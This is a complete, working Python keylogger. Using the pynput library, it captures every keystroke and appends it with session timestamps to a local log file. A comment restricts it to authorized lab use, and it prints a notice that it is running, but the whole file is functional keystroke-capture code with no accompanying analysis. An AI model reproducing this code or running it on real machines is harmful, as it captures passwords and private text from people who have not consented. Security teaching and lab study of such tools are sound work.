# keylogger.py - records keystrokes to a local file
# Authorized lab use only. Press ESC to stop.

from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"


def write_log(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)


def on_press(key):
    try:
        write_log(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            write_log(" ")
        elif key == keyboard.Key.enter:
            write_log("\n")
        else:
            write_log(f"[{key.name}]")


def on_release(key):
    if key == keyboard.Key.esc:
        return False


def main():
    print("Keylogger running - press ESC to stop.")
    write_log(f"\n--- session start {datetime.now()} ---\n")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    write_log(f"\n--- session end {datetime.now()} ---\n")


if __name__ == "__main__":
    main()